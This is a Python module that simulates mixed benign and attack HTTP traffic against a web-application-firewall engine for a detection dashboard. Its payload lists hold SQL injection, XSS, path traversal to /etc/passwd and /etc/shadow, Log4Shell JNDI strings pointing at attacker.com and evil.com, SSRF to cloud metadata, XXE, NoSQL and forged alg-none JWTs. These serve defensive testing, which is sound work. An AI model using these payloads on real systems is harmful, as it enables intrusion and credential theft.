"""
Attack Traffic Simulator

Generates realistic bursts of traffic (benign + attack) and routes them
through the WAF engine. Used by the demo dashboard to showcase real-time detection.
"""

import asyncio
import random
import time
from typing import Optional, Callable, Awaitable
import sys
from pathlib import Path

ROOT = Path(__file__).parent.parent
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from ml.dataset_generator import generate_dataset

# ── Sample payloads (lighter weight versions for real-time demo) ──────────────
_NORMAL = [
    ('GET', '/api/products?page=1&limit=10', {}, ''),
    ('GET', '/api/users/me', {}, ''),
    ('POST', '/api/cart/add', {}, 'product_id=42&qty=1'),
    ('GET', '/static/app.js', {}, ''),
    ('GET', '/search?q=laptop&sort=price', {}, ''),
    ('POST', '/login', {}, 'username=alice&password=SecurePass123'),
    ('GET', '/dashboard', {}, ''),
    ('GET', '/api/orders?user_id=5&status=pending', {}, ''),
    ('PUT', '/api/profile', {}, 'name=Alice+Smith&bio=Developer'),
    ('GET', '/news', {}, ''),
]

_SQLI = [
    ('GET', "/api/products?id=1' OR '1'='1", {}, ''),
    ('POST', '/login', {}, "username=admin'--&password=x"),
    ('GET', "/search?q=1 UNION SELECT username,password FROM users--", {}, ''),
    ('GET', "/api/users?id=1' AND SLEEP(5)--", {}, ''),
    ('POST', '/register', {}, "email=x' OR 1=1--&password=test"),
    ('GET', "/api/products?cat=1; DROP TABLE products--", {}, ''),
    ('GET', "/tienda1/publico/anadir.jsp?id=1' UNION SELECT NULL,NULL--", {}, ''),
]

_XSS = [
    ('GET', '/search?q=<script>alert(document.cookie)</script>', {}, ''),
    ('POST', '/comments', {}, 'body=<img src=x onerror=alert(1)>&post_id=1'),
    ('GET', '/profile?name="><script>alert(1)</script>', {}, ''),
    ('POST', '/feedback', {}, 'message=<svg onload=alert(1)>&rating=5'),
    ('GET', '/api/posts?filter=<iframe src=javascript:alert(1)>', {}, ''),
]

_PATH_TRAVERSAL = [
    ('GET', '/download?file=../../../../etc/passwd', {}, ''),
    ('GET', '/static?name=..%2F..%2F..%2Fetc%2Fshadow', {}, ''),
    ('GET', '/api/files?path=../../../windows/system32/cmd.exe', {}, ''),
    ('GET', '/view?doc=../../../../proc/self/environ', {}, ''),
]

_LOG4SHELL = [
    ('GET', '/api/login', {'User-Agent': '${jndi:ldap://attacker.com/exploit}'}, ''),
    ('POST', '/api/search', {'X-Api-Version': '${jndi:rmi://evil.com/x}'}, 'query=test'),
    ('GET', '/api/health', {'X-Forwarded-For': '${jndi:ldap://evil.com/x}'}, ''),
]

_BOT = [
    ('GET', '/admin', {'User-Agent': 'sqlmap/1.7.8#stable'}, ''),
    ('GET', '/.env', {'User-Agent': 'nikto/2.1.6'}, ''),
    ('GET', '/wp-login.php', {'User-Agent': 'python-requests/2.28.0'}, ''),
    ('GET', '/server-status', {'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)'}, ''),
    ('GET', '/phpinfo.php', {'User-Agent': 'dirbuster/1.0-RC1'}, ''),
    ('GET', '/admin/config.php', {'User-Agent': 'ffuf/v1.5.0'}, ''),
]

_NOSQL = [
    ('POST', '/api/users/login', {'Content-Type': 'application/json'},
     '{"username":{"$ne":null},"password":{"$ne":null}}'),
    ('POST', '/rest/user/login', {'Content-Type': 'application/json'},
     '{"email":{"$regex":".*"},"password":{"$gt":""}}'),
    ('GET', '/api/products?filter={"$where":"1==1"}', {}, ''),
    ('POST', '/graphql', {'Content-Type': 'application/json'},
     '{"query":"{ users(filter: {\\"$where\\":\\"sleep(5000)\\"}) { id email } }"}'),
    ('GET', '/api/search?q=username[$ne]=invalid&password[$ne]=invalid', {}, ''),
]

_JWT = [
    ('GET', '/api/admin',
     {'Authorization': 'Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6MSwiZW1haWwiOiJhZG1pbkBqdWljZS1zaC5vcCIsInJvbGUiOiJhZG1pbiJ9.'},
     ''),
    ('GET', '/rest/user/whoami',
     {'Authorization': 'Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.'},
     ''),
    ('DELETE', '/api/users/1',
     {'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwiZW1haWwiOiJ1c2VyQGp1aWNlLXNoLm9wIiwicm9sZSI6ImFkbWluIn0.tampered'},
     ''),
]

_SSRF = [
    ('GET', '/api/fetch?url=http://169.254.169.254/latest/meta-data/', {}, ''),
    ('POST', '/api/webhook', {'Content-Type': 'application/json'},
     '{"url":"http://192.168.1.1/admin"}'),
    ('GET', '/proxy?target=file:///etc/passwd', {}, ''),
    ('GET', '/download?src=http://127.0.0.1:6379/INFO', {}, ''),
    ('POST', '/api/import', {'Content-Type': 'application/json'},
     '{"url":"dict://localhost:6379/INFO"}'),
]

_XXE = [
    ('POST', '/api/xml', {'Content-Type': 'application/xml'},
     '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'),
    ('POST', '/api/parse', {'Content-Type': 'application/xml'},
     '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>'),
]

_IDOR = [
    ('GET', '/rest/basket/1', {}, ''),
    ('GET', '/api/users/1/orders', {}, ''),
    ('DELETE', '/api/users/2', {}, ''),
    ('GET', '/rest/user/1', {}, ''),
    ('PUT', '/api/orders/1', {'Content-Type': 'application/json'},
     '{"status":"cancelled","userId":1}'),
]

_JUICE_SHOP = [
    ('GET', "/rest/products/search?q=' OR 1=1--", {}, ''),
    ('POST', '/rest/user/login', {'Content-Type': 'application/json'},
     '{"email":"admin@juice-sh.op\'--","password":"anything"}'),
    ('GET', '/api/challenges', {}, ''),
    ('GET', '/rest/products/search?q=<<script>alert(\'xss\')//</script>', {}, ''),
    ('GET', '/api/feedbacks',
     {'Authorization': 'Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6MSwiZW1haWwiOiJhZG1pbkBqdWljZS1zaC5vcCIsInJvbGUiOiJhZG1pbiJ9.'},
     ''),
]

_SCENARIOS = {
    'normal':         (_NORMAL,         5,  'Normal browsing traffic'),
    'sqli':           (_SQLI,           3,  'SQL Injection attack'),
    'xss':            (_XSS,            3,  'Cross-Site Scripting attack'),
    'path_traversal': (_PATH_TRAVERSAL, 3,  'Path Traversal attack'),
    'log4shell':      (_LOG4SHELL,      2,  'Log4Shell (CVE-2021-44228) exploit'),
    'bot_scan':       (_BOT,            4,  'Automated scanner / bot'),
    'nosql':          (_NOSQL,          3,  'NoSQL / MongoDB injection'),
    'jwt_abuse':      (_JWT,            2,  'JWT algorithm confusion & abuse'),
    'ssrf':           (_SSRF,           3,  'Server-Side Request Forgery'),
    'xxe':            (_XXE,            2,  'XML External Entity injection'),
    'idor':           (_IDOR,           3,  'Insecure Direct Object Reference'),
    'juice_shop':     (_JUICE_SHOP,     4,  'OWASP Juice Shop attack suite'),
    'mixed':          (
        _NORMAL + _SQLI + _XSS + _PATH_TRAVERSAL + _BOT +
        _NOSQL + _JWT + _SSRF + _IDOR,
        8, 'Mixed multi-vector attack traffic',
    ),
    'apt':            (
        _NOSQL + _JWT + _SSRF + _XXE + _IDOR + _JUICE_SHOP,
        3,  'APT-style multi-stage attack',
    ),
    'full_dataset':   (
        [], # To be dynamically populated
        10, 'Full synthetic dataset test (mixed)'
    ),
    'ddos': (
        _NORMAL * 5,
        20, 'DDoS / flood simulation',
    ),
}

_IPS = [
    '10.0.0.{}'.format(i) for i in range(1, 100)
] + [
    '192.168.1.{}'.format(i) for i in range(1, 50)
] + [
    '185.220.101.{}'.format(i) for i in range(1, 20)  # known bad range
]

# ── Simulation state ──────────────────────────────────────────────────────────
_running = False
_task: Optional[asyncio.Task] = None


async def run_simulation(
    scenario: str,
    n_requests: int,
    delay: float,
    analyze_fn: Callable[[dict], Awaitable[dict]],
    broadcast_fn: Callable[[dict], Awaitable[None]],
):
    """Run a simulation scenario, calling analyze_fn for each request."""
    global _running
    _running = True

    if scenario == 'full_dataset':
        # Generate the dataset dynamically (fast)
        df = generate_dataset()
        # Randomly sample n_requests from it
        sample = df.sample(n=min(n_requests, len(df))).to_dict('records')
        payloads = [
            (req.get('method', 'GET'), req.get('url', '/'), req.get('headers', {}), req.get('body', ''))
            for req in sample
        ]
    else:
        payloads, _, _ = _SCENARIOS.get(scenario, _SCENARIOS['mixed'])

    for i in range(n_requests):
        if not _running:
            break

        method, url, extra_headers, body = random.choice(payloads) if scenario != 'full_dataset' else payloads[i]
        ip = random.choice(_IPS)

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.9',
        }
        headers.update(extra_headers)

        req = {
            'method':  method,
            'url':     url,
            'headers': headers,
            'body':    body,
            'ip':      ip,
        }

        try:
            result = await analyze_fn(req)
            await broadcast_fn({'type': 'request', 'data': _slim(result)})
        except Exception as e:
            pass   # Never crash the simulator

        if delay > 0:
            await asyncio.sleep(delay)

    _running = False


def _slim(result: dict) -> dict:
    """Trim result to only what the dashboard needs (reduce WS payload size)."""
    return {
        'id':                 result['id'],
        'timestamp':          result['timestamp'],
        'method':             result['method'],
        'url':                result['url'][:80],
        'ip':                 result['ip'],
        'decision':           result['decision'],
        'confidence':         result['confidence'],
        'attack_type':        result['attack_type'],
        'blocked_by':         result['blocked_by'],
        'ml_score':           result.get('ml_score', 0),
        'unsupervised_score': result.get('unsupervised_score', 0),
        'features': {
            k: result.get('features', {}).get(k, 0)
            for k in ['sql_keyword_count', 'xss_pattern_count', 'path_traversal_count',
                      'cmd_injection_count', 'nosql_operator_count', 'suspicious_ua',
                      'url_length', 'body_entropy', 'jwt_alg_none', 'ssrf_pattern_count']
        },
    }


def start(
    scenario: str,
    analyze_fn,
    broadcast_fn,
    n_requests: int = 50,
    delay: float = 0.3,
):
    """Start a simulation as an asyncio background task."""
    global _task, _running
    _running = True
    _task = asyncio.create_task(
        run_simulation(scenario, n_requests, delay, analyze_fn, broadcast_fn)
    )
    return _task


def stop():
    global _running, _task
    _running = False
    if _task and not _task.done():
        _task.cancel()


def get_scenarios():
    return {
        'scenarios': [
            {'id': k, 'name': k.replace('_',' ').title(), 'description': v[2], 'request_count': len(v[0])}
            for k, v in _SCENARIOS.items()
        ]
    }


def is_running() -> bool:
    return _running
